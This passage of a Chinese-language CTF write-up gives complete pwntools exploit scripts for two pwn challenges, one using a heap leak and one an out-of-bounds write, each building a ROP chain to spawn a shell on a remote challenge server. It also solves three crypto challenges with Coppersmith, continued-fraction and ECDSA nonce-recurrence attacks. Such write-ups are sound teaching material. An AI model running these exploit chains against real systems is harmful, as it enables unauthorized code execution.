+#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
+s    = lambda   x : io.send(x)
+sa   = lambda x,y : io.sendafter(x,y)
+sl   = lambda   x : io.sendline(x)
+sla  = lambda x,y : io.sendlineafter(x,y)
+r    = lambda x   : io.recv(x)
+ru   = lambda x   : io.recvuntil(x)
+rl   = lambda     : io.recvline()
+itr  = lambda     : io.interactive()
+uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
+uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
+ls   = lambda x   : log.success(x)
+lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))
+
+attack = '43.138.2.216:19999'.replace(' ',':')
+binary = './vul2_revenge'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:return gdb.debug(binary,gdbscript)
+    if args.TAG:return remote(*args.TAG.split(':'))
+    if args.REM:return remote(*attack.split(':'))
+    return process([binary] + argv, *a, **kw)
+
+#context(arch='amd64', log_level = 'debug')
+context(binary = binary, log_level = 'debug',
+terminal='tmux splitw -h -l 170'.split(' '))
+libc = context.binary.libc
+#elf  = ELF(binary)
+#print(context.binary.libs)
+#libc = ELF('./libc.so.6')
+#import socks
+#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
+gdbscript = '''
+brva 0x01A0D
+brva 0x1A1F
+brva 0x01828
+#continue
+'''.format(**locals())
+#import os
+#os.systimport os
+#io = remote(*attack.split(':'))
+
+def note_system():
+    ru('> ')
+    sl('5')
+
+def add(idx,size,text):
+    ru('Choose an option: ')
+    sl('1')
+    ru('): ')
+    sl(str(idx))
+    ru('size (1-2048): ')
+    if len(str(size))>=4:
+        s(str(size))
+    else:
+        sl(str(size))
+    ru('ontent: ')
+    s(text)
+
+def rm(idx):
+    ru('Choose an option: ')
+    sl('2')
+    ru(': ')
+    sl(str(idx))
+
+def show(idx):
+    ru('Choose an option: ')
+    sl('3')
+    ru(': ')
+    sl(str(idx))
+    ru('---\n')
+io = start([])
+
+note_system()
+
+add(1,0x5f7,'H'*0x10)
+add(2,0x17,'A'*0x10)
+add(0,0x17,'B'*0x10)
+
+rm(1)
+
+add(1,0x567,'E'*0x10)
+
+ru('Choose an option: ')
+sl('4')
+
+ru('> ')
+sl('1')
+ru('shout:')
+pay = b'A' * 0x23
+pay += p8(0x37)
+pay += p8(0x6a)
+#gdb.attach(io,gdbscript=gdbscript)
+sl(pay)
+
+note_system()
+
+show(0)
+heap_addr =  uu64(r(6))
+lss('heap_addr')
+add(2,0x600,'hehe')
+add(3,0x600,'hehe')
+rm(2)
+
+pay = p64(heap_addr+0x10) + p64(heap_addr-0x10)
+add(6,0x17,pay)
+show(0)
+libc_base =  uu64(r(6)) - 0x203f90
+lss('libc_base')
+rm(1)
+libc.address = libc_base
+system = libc.sym['system']
+bin_sh = next(libc.search(b'/bin/sh'))
+poprdi = next(libc.search(asm('pop rdi;ret')))
+poprsi = next(libc.search(asm('pop rsi;ret')))
+
+add(1,0x17,p64(0x414243)+p64(libc_base + 0x2a871)) # pop 
+
+rop  = p64(0)
+rop += p64(poprdi)
+rop += p64(bin_sh)
+rop += p64(poprsi)
+rop += p64(0)
+rop += p64(0x00000000000b503c + libc_base) # pop rdx
+rop += p64(0) * 5
+rop += p64(libc.sym['execve'])
+add(0xf,0x600,rop)
+
+sl('4')
+ru('>')
+sl('6')
+
+#pay = b'ABC'
+#add(7,0x40,pay)
+
+#ru('Choose an option: ')
+#sl('4')
+
+itr()
+```
+
+## Library
+
+漏洞在功能3，没有限制 page 的索引，可以任意偏移写
+
+![img](d7301785-2a38-426f-a78d-fc411ce3be78.png)
+
+本地测试发现 编辑写入的数据所在的段有两种情况，在heap 下面的时候， 他会和其他线程的stack 地址有固定偏移
+
+![img](e70cbba8-2e31-413e-89a9-00a9342f6c42.png)
+
+![img](711fc631-ad5b-42e9-b0cc-837a046e84d1.png)
+
+![img](dec030ad-b986-482e-86f3-aa899ffd8cfa.png)
+
+后面直接写rop 就行了，elf 里面gadget 足够用了，还有 syscall
+
+```Python
+from pwn import *
+#from ctypes import CDLL
+#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
+s    = lambda   x : io.send(x)
+sa   = lambda x,y : io.sendafter(x,y)
+sl   = lambda   x : io.sendline(x)
+sla  = lambda x,y : io.sendlineafter(x,y)
+r    = lambda x   : io.recv(x)
+ru   = lambda x   : io.recvuntil(x)
+rl   = lambda     : io.recvline()
+itr  = lambda     : io.interactive()
+uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
+uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
+ls   = lambda x   : log.success(x)
+lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))
+
+attack = '1.95.8.146:25314'.replace(' ',':')
+binary = './library.kexe'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:return gdb.debug(binary,gdbscript)
+    if args.TAG:return remote(*args.TAG.split(':'))
+    if args.REM:return remote(*attack.split(':'))
+    return process([binary] + argv, *a, **kw)
+
+#context(arch='amd64', log_level = 'debug')
+context(binary = binary, log_level = 'debug',
+terminal='tmux splitw -h -l 170'.split(' '))
+#libc = context.binary.libc
+#elf  = ELF(binary)
+#print(context.binary.libs)
+#libc = ELF('./libc.so.6')
+#import socks
+#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
+gdbscript = '''
+b *0x23d8a2
+b *0x0252416
+#continue
+'''.format(**locals())
+#import os
+#os.systimport os
+#io = remote(*attack.split(':'))
+io = start([])
+
+def add(name):
+    ru('Your choice: \n')
+    sl('1')
+    ru('borrow?\n')
+    sl(name)
+def edit(idx,page,text):
+    ru('Your choice: \n')
+    sl('3')
+    ru('read?\n')
+    sl(str(idx))
+    ru('page: ')
+    sl(str(page))
+    ru('write: ')
+    s(text)
+
+
+add('hack1')
+edit(0,1,'BBBBBBB')
+
+#gdb.attach(io,gdbscript)
+rax = 0x000000000024600f # pop rax ; ret
+rdi = 0x0000000000227871 # pop rdi ; ret
+rsi = 0x000000000022727d # pop rsi ; ret
+rdx = 0x00000000002539c4 # pop rdx ; ret
+mov_rsi_rdx = 0x0000000000252d4c # mov qword ptr [rsi], rdx ; ret
+syscall =  0x25FC90
+pay  = [
+    rdx,0x68732f6e69622f,
+    rsi,0x26e7b8,
+    mov_rsi_rdx,
+    rdi,0x3b,
+    rsi,0x26e7b8,
+    rdx,0,
+    syscall,
+]
+
+for i in range(len(pay)):
+    edit(0,0x218198+i,p64(pay[i]))
+
+sleep(5)
+
+itr()
+```
+
+![img](8564e85a-08de-48c4-bf7a-6e49ce112132.png)
+
+# Crypto
+
+## math_problem
+
+```Python
+import gmpy2  
+from gmpy2 import *  
+from Crypto.Util.number import *  
+from random import randint  
+from gmpy2 import invert  
+from scret import flag  
+  
+def myfunction(num):  
+    output = 0  
+    output=num**3  
+    return output  
+  
+if __name__ == '__main__':  
+    flag_len = len(flag)  
+    p, q = getPrime(512), getPrime(512)  
+  
+    while True:  
+        r = getPrime(512)  
+        R = bytes_to_long(str(r).encode())  
+        if isPrime(R):  
+            break  
+  
+    n = p * q * r  
+    hint1 = R * r  
+    mod = myfunction(n)  
+    hint2 = pow(3*n+1, p % (2 ** 400), mod)  
+    m = bytes_to_long(flag)  
+    c = pow(m, 65537, n)  
+  
+    print('All data:')  
+    print(f'n = {n}')  
+    print(f'c = {c}')  
+    print(f'hint1 = {hint1}')  
+    print(f'hint2 = {hint2}')  
+```
+
+给出的数据有 $n=pqr$，$hint_1=R \cdot r$，$hint_2 \equiv (3n+1)^{p\bmod{2^{400}}} \pmod{n^3}$，显然有 $gcd(n,hint_1)=r$，猜测flag不大的情况下直接在模 $n$ 下就能解出flag：
+
+```Python
+from Crypto.Util.number import *
+from gmpy2 import gcd
+
+n = 1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921
+c = 102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984
+hint1 = 41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333
+hint2 = 10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907
+
+r = gcd(n, hint1)
+d = inverse(65537, r-1)
+m = pow(c, d, r)
+print(long_to_bytes(m))
+```
+
+对于 $\text{hint}_1$，设 $p_l \equiv p \pmod{2^{400}}$，那么通过二项式定理展开整理可以得到：
+
+$\text{hint}_2 \equiv 1 + p_l \cdot 3n + \frac{p_l(p_l-1)}{2}(3n)^2 \pmod{n^3}$
+
+模 $n^2$ 可以更进一步得到：
+
+$\text{hint}_2 \equiv 1 + p_l \cdot 3n \pmod{n^2}$
+
+显然的，$p_l \cdot 3n + 1 = \text{hint}_2 \bmod n^2$，也就是说我们可以通过下式直接得到 $p$ 的低400位 $p_l$：
+
+$p_l = \frac{\text{hint}_2 \bmod n^2 - 1}{3n}$
+
+通过 Coppersmith 就可以还原出完整的 $p$ 了。
+
+```Python
+# sage
+from Crypto.Util.number import *
+
+n = 1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921
+c = 102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984
+hint1 = 41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333
+hint2 = 10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907
+
+r = GCD(n, hint1)
+pl = (hint2 % (n^2) - 1) // (3 * n)
+R.<x> = Zmod(n//r)[]
+f = x * 2^400 + pl
+f = f.monic()
+
+ph = f.small_roots(X=2^112, beta=0.4)[0]
+
+p = ZZ(ph * 2^400 + pl)
+q = n // (p * r)
+
+phi = (p - 1) * (q - 1) * (r - 1)
+
+d = inverse(65537, phi)
+m = pow(c, d, n)
+print(long_to_bytes(m))
+```
+
+## RRRSSSAAA
+
+为了解密给定的密文，我们需要从公钥中恢复私钥。公钥包括模数 N 和指数 e，其中 e是通过一个自定义过程生成的。分析发现，私钥指数 $d$ 可以表示为 $d=\phi-d_{small}$，其中 $\phi=(p^4-1)(q^4-1)$，且 $d_{small}$ 是一个 1021 位的小整数。通过连分数方法，可以从 e 和 $N^4$ 的比值中恢复 $d_{small}$。然后，解密过程简化为计算 $c^{-d_{small}} \bmod N$。
+
+所以首先计算 $N^4$，然后对有理数 $e/N^4$ 进行连分数展开，并遍历其渐近分数。对于每个渐近分数，检查分母的位长度是否为 1021 位（即 $2^{1020} \leq 分母 < 2^{1021}$），随后对每个候选 $d_{small}$，尝试解密。
+
+计算 $c$ 在模 $N$ 下的逆元，将 $m$ 转换为字节序列，检查是否包含 "L3H"的内容。
+
+```Python
+from sage.all import *
+import binascii
+
+N = 99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609
+e = 74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827
+c = 98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879
+
+N4 = N**4
+
+alpha = e / N4
+
+cf = continued_fraction(alpha)
+convergents = cf.convergents()
+
+for conv in convergents:
+    k_candidate = conv.numerator()
+    d_small_candidate = conv.denominator()
+    
+    if d_small_candidate >= 2**1020 and d_small_candidate < 2**1021:
+        try:
+            # Decrypt
+            c_inv = inverse_mod(c, N)
+            m = pow(c_inv, d_small_candidate, N)
+            
+            m_bytes = int(m).to_bytes((m.bit_length() + 7) // 8, 'big')
+            
+            if b'L3H' in m_bytes:
+                print("Flag found:", m_bytes.decode())
+                break
+        except:
+            continue
+
+else:
+    print("Flag not found. Try more convergents or check the approach.")
+```
+
+![img](9b171591-f889-413c-9bf8-ce93a93bc9b6.png)
+
+## EzECDSA  
+
+简单的密码题，把附件丢给gemini然后给出解题脚本即可，一次可能不行，让他修改优化即可
+
+![img](fb9ce8e3-89fe-43ee-9c6c-9fec648d4276.png)
+
+```Python
+import hashlib
+from ecdsa import NIST256p
+from collections import defaultdict
+
+
+def mod_inverse(a, m):
+    """
+    计算 a 模 m 的乘法逆元。
+    使用扩展欧几里得算法。
+    """
+    g, x, y = egcd(a, m)
+    if g != 1:
+        raise Exception('modular inverse does not exist')
+    return x % m
+
+
+def egcd(a, b):
+    """
+    扩展欧几里得算法。
+    返回 g, x, y 使得 a*x + b*y = g = gcd(a, b)。
+    """
+    if a == 0:
+        return b, 0, 1
+    g, y, x = egcd(b % a, a)
+    return g, x - (b // a) * y, y
+
+
+def clean_poly(p):
+    """
+    移除多项式列表开头多余的零，使其规范化。
+    """
+    if len(p) > 1 and p[0] == 0:
+        idx = 0
+        while idx < len(p) - 1 and p[idx] == 0:
+            idx += 1
+        return p[idx:]
+    return p
+
+
+def poly_add(p1, p2, m):
+    """
+    将两个多项式 p1 和 p2 相加，模 m。
+    多项式表示为系数列表，从最高次幂到最低次幂。
+    例如，[a, b, c] 代表 ax^2 + bx + c。
+    """
+    d1 = len(p1)
+    d2 = len(p2)
+    res = [0] * max(d1, d2)
+    for i in range(d1):
+        res[i + max(d1, d2) - d1] = (p1[i] + res[i + max(d1, d2) - d1]) % m
+    for i in range(d2):
+        res[i + max(d1, d2) - d2] = (p2[i] + res[i + max(d1, d2) - d2]) % m
+    return clean_poly(res)
+
+
+def poly_sub(p1, p2, m):
+    """
+    将多项式 p2 从 p1 中减去，模 m。
+    """
+    d1 = len(p1)
+    d2 = len(p2)
+    res = list(p1)
+    if d1 < d2:
+        res = [0] * (d2 - d1) + res
+
+    for i in range(d2):
+        res[len(res) - d2 + i] = (res[len(res) - d2 + i] - p2[i] + m) % m
+
+    return clean_poly(res)
+
+
+def poly_mul(p1, p2, m):
+    """
+    将两个多项式 p1 和 p2 相乘，模 m。
+    """
+    d1 = len(p1)
+    d2 = len(p2)
+    res = [0] * (d1 + d2 - 1)
+    for i in range(d1):
+        for j in range(d2):
+            res[i + j] = (res[i + j] + p1[i] * p2[j]) % m
+    return clean_poly(res)
+
+
+def poly_div(dividend, divisor, m):
+    """
+    执行多项式除法（带余数），模 m。
+    返回 (商, 余数)。
+    假定除数的最高次系数是可逆的。
+    """
+    dividend = list(dividend)  # 复制以避免修改原始列表
+    divisor = list(divisor)
+
+    dividend = clean_poly(dividend)
+    divisor = clean_poly(divisor)
+
+    deg_dend = len(dividend) - 1
+    deg_div = len(divisor) - 1
+
+    if deg_div < 0:
+        raise ValueError("Divisor cannot be a zero polynomial")
+
+    if deg_div > deg_dend:
+        return [0], dividend
+
+    lc_div = divisor[0]
+    lc_inv = mod_inverse(lc_div, m)
+
+    quotient = [0] * (deg_dend - deg_div + 1)
+    remainder = list(dividend)
+
+    for i in range(deg_dend - deg_div + 1):
+        # 得到当前余数的最高次系数
+        lc_rem = remainder[i]
+
+        # 计算商的当前项
+        q_term = (lc_rem * lc_inv) % m
+        quotient[i] = q_term
+
+        # 从余数中减去除数乘以商项的结果
+        for j in range(deg_div + 1):
+            term = (q_term * divisor[j]) % m
+            remainder[i + j] = (remainder[i + j] - term + m) % m
+
+    # 规范化商和余数
+    remainder = clean_poly(remainder[len(quotient):])
+    quotient = clean_poly(quotient)
+
+    return quotient, remainder
+
+
+def poly_gcd(p1, p2, m):
+    """
+    使用欧几里得算法计算两个多项式在 Z_m 上的 GCD。
+    """
+    a = p1
+    b = p2
+
+    while any(x != 0 for x in b):
+        _, r = poly_div(a, b, m)
+        a = b
+        b = r
+
+    # 规范化多项式，使最高次系数为 1
+    if any(x != 0 for x in a):
+        lc_inv = mod_inverse(a[0], m)
+        a = [(x * lc_inv) % m for x in a]
+
+    return a
+
+
+def main():
+    # 1. 定义曲线和阶数
+    curve = NIST256p
+    n = curve.order
+
+    # 2. 解析 signatures.txt
+    h_values = []
+    r_values = []
+    s_values = []
+
+    # 使用提供的文件内容
+    content = """h: 5832921593739954772384341732387581797486339670895875430934592373351528180781, r: 78576287416983546819312440403592484606132915965726128924031253623117138586396, s: 108582979377193966287732302562639670357586761346333866965382465209612237330851
+h: 85517239535736342992982496475440962888226294744294285419613128065975843025446, r: 60425040031360920373082268221766168683222476464343035165195057634060216692194, s: 27924509924269609509672965613674355269361001011362007412205784446375567959036
+h: 90905761421138489726836357279787648991884324454425734512085180879013704399530, r: 75779605492148881737630918749717271960050893072832415117470852442721700807111, s: 72740499400319841565890543635298470075267336863033867770902108413176557795256
+h: 103266614372002123398101167242562044737358751274736728792365384600377408313142, r: 89519601474973769723244654516140957004170211982048028366151899055366457476708, s: 23639647021855356876198750083669161995553646511611903128486429649329358343588
+h: 9903460667647154866199928325987868915846235162578615698288214703794150057571, r: 17829304522948160053211214227664982869100868125268116260967204562276608388692, s: 74400189461172040580877095515356365992183768921088660926738652857846750009205
+h: 54539896686295066164943194401294833445622227965487949234393615233511802974126, r: 66428683990399093855578572760918582937085121375887639383221629490465838706027, s: 25418035697368269779911580792368595733749376383350120613502399678197333473802
+"""
+
+    lines = content.strip().split('\n')
+    for line in lines:
+        parts = line.split(', ')
+        h = int(parts[0].split(': ')[1])
+        r = int(parts[1].split(': ')[1])
+        s = int(parts[2].split(': ')[1])
+        h_values.append(h)
+        r_values.append(r)
+        s_values.append(s)
+
+    # 3. 将 k_i 表示为关于 d 的线性多项式
+    k_polys = []
+    for i in range(6):
+        s_inv = mod_inverse(s_values[i], n)
+        A = (h_values[i] * s_inv) % n
+        B = (r_values[i] * s_inv) % n
+        # [B, A] 代表 B*d + A
+        k_polys.append([B, A])
+
+    # 4. 从递推关系中构造多项式方程
+    # 递推关系为：k_{i+1} = a*k_i^2 + b*k_i + c
+    # 通过消去 a, b, c，我们可以得到一个只依赖于 d 的多项式方程
+    # 方程形式为: a(k_2-k_0)(k_2-k_1)(k_1-k_0) = (k_3-k_2)(k_1-k_0) - (k_2-k_1)^2
+    # 我们将左边和右边分别表示为关于 d 的多项式，并使用两组不同的 k 值来得到两个多项式方程。
+
+    def get_poly_for_a_numerator(k_p0, k_p1, k_p2, k_p3):
+        # 分子: (k_3 - k_2)*(k_1 - k_0) - (k_2 - k_1)^2
+        p32 = poly_sub(k_p3, k_p2, n)
+        p10 = poly_sub(k_p1, k_p0, n)
+        p21 = poly_sub(k_p2, k_p1, n)
+
+        num_part1 = poly_mul(p32, p10, n)
+        num_part2 = poly_mul(p21, p21, n)
+        return poly_sub(num_part1, num_part2, n)
+
+    def get_poly_for_a_denominator(k_p0, k_p1, k_p2):
+        # 分母: (k_2 - k_0)*(k_2 - k_1)*(k_1 - k_0)
+        p20 = poly_sub(k_p2, k_p0, n)
+        p21 = poly_sub(k_p2, k_p1, n)
+        p10 = poly_sub(k_p1, k_p0, n)
+
+        den_part1 = poly_mul(p20, p21, n)
+        return poly_mul(den_part1, p10, n)
+
+    # 得到第一组方程：a(k0..k3) = a(k1..k4)
+    num1 = get_poly_for_a_numerator(k_polys[0], k_polys[1], k_polys[2], k_polys[3])
+    den1 = get_poly_for_a_denominator(k_polys[0], k_polys[1], k_polys[2])
+
+    num2 = get_poly_for_a_numerator(k_polys[1], k_polys[2], k_polys[3], k_polys[4])
+    den2 = get_poly_for_a_denominator(k_polys[1], k_polys[2], k_polys[3])
+
+    # 方程为 num1*den2 - num2*den1 = 0
+    poly1 = poly_sub(poly_mul(num1, den2, n), poly_mul(num2, den1, n), n)
+
+    # 得到第二组方程：a(k1..k4) = a(k2..k5)
+    num3 = get_poly_for_a_numerator(k_polys[2], k_polys[3], k_polys[4], k_polys[5])
+    den3 = get_poly_for_a_denominator(k_polys[2], k_polys[3], k_polys[4])
+
+    # 方程为 num2*den3 - num3*den2 = 0
+    poly2 = poly_sub(poly_mul(num2, den3, n), poly_mul(num3, den2, n), n)
+
+    # 5. 计算两个多项式的最大公约数（GCD）
+    gcd_poly = poly_gcd(poly1, poly2, n)
+
+    # 6. 从 GCD 中提取根
+    # GCD 应该是一个一次多项式，形如 c1*d + c0
+    if len(gcd_poly) == 2:
+        c1 = gcd_poly[0]
+        c0 = gcd_poly[1]
+
+        # d = -c0 * c1_inv mod n
+        c1_inv = mod_inverse(c1, n)
+        d = (-c0 * c1_inv) % n
+
+        print(f"Private key d found: {d}")
+        print(f"Flag: L3HCTF{{{d}}}")
+    else:
+        print("Failed to find a linear GCD polynomial. Something went wrong.")
+
+
+if __name__ == '__main__':
+    main()
+```
+
